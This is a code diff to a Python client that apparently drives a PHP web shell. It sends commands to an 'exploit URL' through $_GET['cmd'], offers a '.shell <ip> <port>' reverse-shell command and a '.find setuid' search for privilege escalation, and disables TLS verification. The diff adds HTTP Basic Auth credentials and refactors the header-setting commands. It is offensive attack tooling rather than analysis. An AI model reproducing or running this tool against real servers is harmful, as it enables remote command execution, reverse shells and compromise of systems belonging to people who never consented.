@@ -26,6 +26,9 @@ headers = {
         'User-Agent': '',
         'Referer': ''
         }
+auth = None
+auth_user = None
+auth_pass = None
 payload = ""
 payload_type = "PHP"
 
@@ -76,7 +79,10 @@ if ($_GET['cmd'] == '_show_phpinfo') {
 def show_help(cmd=None):
   if cmd and cmd[0:1] == '.':
     cmd = cmd[1:]
-  if cmd == "cookies":
+  if cmd == "auth":
+    sys.stdout.write(".auth - show current HTTP Auth credentials\n")
+    sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
+  elif cmd == "cookies":
     sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
   elif cmd == "find":
     sys.stdout.write(".find setuid - search for setuid files\n")
@@ -99,11 +105,18 @@ def show_help(cmd=None):
     sys.stdout.write(".method post - set HTTP method to POST\n")
   elif cmd == "post":
     sys.stdout.write(".post <json> - a json string representing post data you wish to send\n")
+  elif cmd == "referer":
+    sys.stdout.write(".referer - show the HTTP referer string\n")
+    sys.stdout.write(".referer <string> - set the value for HTTP referer\n")
   elif cmd == "shell":
     sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
+  elif cmd == "useragent":
+    sys.stdout.write(".useragent - show the User-Agent string\n")
+    sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
   else:
     sys.stdout.write("""\
 Available commands:
+  .auth
   .cookies
   .exit
   .find
@@ -215,11 +228,17 @@ while True:
     if os.path.isfile(history_file):
         readline.write_history_file(history_file)
     sys.exit(0)
+  elif cmd[0] == ".auth":
+    if len(cmd) > 1:
+      auth_user, auth_pass = input[len(cmd[0])+1:].split(":",1)
+      auth = requests.auth.HTTPBasicAuth(auth_user, auth_pass)
+    else:
+      sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (auth_user, auth_pass))
   elif cmd[0] == ".cookies":
     if not len(cmd) >2:
       sys.stdout.write("[!] Invalid parameters\n")
       continue
-    cookies = json.loads(input[8:])
+    cookies = json.loads(input[len(cmd[0])+1:])
   elif cmd[0] == ".find":
     if len(cmd) is not 2:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -299,7 +318,7 @@ while True:
         method = "post"
       else:
         method = "get"
-    sys.stdout.write("[*] HTTP method set to %s\n" % method.upper())
+    sys.stdout.write("[*] HTTP method set: %s\n" % method.upper())
   elif cmd[0] == ".phpinfo":
     input = "_show_phpinfo"
     exec_cmd = True
@@ -307,14 +326,12 @@ while True:
     if len(cmd) < 2:
       post = {}
     else:
-      post = json.loads(input[6:])
-    sys.stdout.write("[*] POST data set to %s\n" % post)
+      post = json.loads(input[len(cmd[0])+1:])
+    sys.stdout.write("[*] POST data set: %s\n" % post)
   elif cmd[0] == ".referer":
     if len(cmd) > 1:
-      headers['Referer'] = input[len(cmd[0]):]
-      sys.stdout.write("[*] Referer set\n")
-    else:
-      sys.stdout.write("[*] Referer: %s\n" % headers['Referer'])
+      headers['Referer'] = input[len(cmd[0])+1:]
+    sys.stdout.write("[*] Referer set: %s\n" % headers['Referer'])
   elif cmd[0] == ".shell":
     if len(cmd) is not 3:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -335,16 +352,12 @@ while True:
     #exec_cmd = True
   elif cmd[0] == ".url":
     if len(cmd) > 1:
-      url = input[5:]
-      sys.stdout.write("[*] Exploit URL set\n")
-    else:
-      sys.stdout.write("[*] Exploit URL is %s\n" % url)
+      url = input[len(cmd[0])+1:]
+    sys.stdout.write("[*] Exploit URL set: %s\n" % url)
   elif cmd[0] == ".useragent":
     if len(cmd) > 1:
-      headers['User-Agent'] = input[len(cmd[0]):]
-      sys.stdout.write("[*] User-Agent set\n")
-    else:
-      sys.stdout.write("[*] User-Agent: %s\n" % headers['User-Agent'])
+      headers['User-Agent'] = input[len(cmd[0])+1:]
+    sys.stdout.write("[*] User-Agent set: %s\n" % headers['User-Agent'])
   else:
     exec_cmd = True
 
@@ -365,9 +378,9 @@ while True:
       sys.stdout.write("[Q] " + query + "\n")
     try:
       if method == "post":
-        r = requests.post(query, data=post, verify=False, cookies=cookies, headers=headers)
+        r = requests.post(query, data=post, verify=False, cookies=cookies, headers=headers, auth=auth)
       else:
-        r = requests.get(query, verify=False, cookies=cookies, headers=headers)
+        r = requests.get(query, verify=False, cookies=cookies, headers=headers, auth=auth)
       ## sanitize the output. we only want to see our commands if possible
       output = r.text.split('--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--')
       if len(output) > 1:
